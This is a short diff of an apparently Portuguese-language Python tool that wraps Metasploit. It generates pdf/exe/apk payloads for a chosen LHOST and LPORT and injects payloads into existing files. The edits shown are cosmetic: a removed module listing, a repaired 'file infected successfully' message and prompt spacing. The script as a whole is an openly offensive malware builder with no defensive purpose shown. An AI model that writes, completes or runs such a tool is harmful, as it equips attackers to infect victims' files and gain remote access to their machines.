@@ -26,11 +26,6 @@ def list_msf4_modules():
             for file in files:
                 if file.endswith(".rb"):
                     module_list.append(os.path.join(root, file))
-        if module_list:
-            for module in module_list:
-                print(module)
-        else:
-            print("Nenhum módulo encontrado no diretório .msf4.")
         return module_list
     else:
         print("Diretório .msf4 não encontrado.")
@@ -100,8 +95,7 @@ def infect_existing_file(file_path, lhost, lport):
     print(" ".join(cmd))
     try:
         subprocess.call(cmd)
-        print(f"Arquivo {file_path}
-infectado com sucesso.")
+        print(f"Arquivo {file_path} infectado com sucesso.")
     except Exception as e:
         print(f"Erro ao infectar o arquivo: {str(e)}")
 
@@ -123,7 +117,7 @@ def main():
         if option == "1":
             payload_type = input("Escolha o tipo de payload (pdf/exe/apk): ")
             lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
-            lport = input("Insira o LPORT: ")
+            lport = input("Insira o LPORT:  ")
             generate_payload(payload_type, lhost, lport)
         elif option == "2":
             lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
